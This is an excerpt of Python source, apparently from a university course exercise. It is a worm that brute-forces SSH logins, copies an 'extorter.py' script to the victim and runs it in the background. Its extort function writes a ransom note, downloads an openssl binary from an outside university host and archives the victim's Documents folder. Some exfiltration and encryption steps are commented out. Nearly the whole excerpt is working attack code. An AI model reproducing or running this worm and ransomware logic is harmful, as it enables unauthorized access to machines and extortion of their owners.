	...
	for (username, password) in credList:
		...
		if tryCredentials(host, username, password, ssh) == 0: 
			...
			if attemptResults:
				...
				sftp.put("extorter.py", "/tmp/extorter.py")
			...
			# run the whole commnand in the background	
			ssh.exec_command("nohup python /tmp/extorter.py &")

			tempSys = [host, username, password]
			return tempSys
		else: 
...
def extort(sshInfo):
	...
	try:
		ssh.connect(sshInfo[0], username=sshInfo[1], password=sshInfo[2])
	except:
		print("Something went wrong")

	sftp = ssh.open_sftp()

	file = open('EnFile.txt', 'w')
	file.write('I have encrypted your files. If you want them back, you will have to purchase my decryption key')
	file.close()

	sftp.put('EnFile.txt', '/home/cpsc/Desktop/EnFile.txt')

	urllib.request.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "openssl")

	ssh.exec_command("tar -cvf /tmp/exdir.tar /home/cpsc/Documents/")
	#sftp.get('/tmp/exdir.tar', '/tmp/exdir.tar')
	#ssh.exec_command("rm -f /tmp/exdir.tar")
	#sftp.rmdir('/home/cpsc/Documents')
	...
	#sftp.put('/tmp/exdir.tar.enc', '/home/cpsc/exdir.tar.enc')
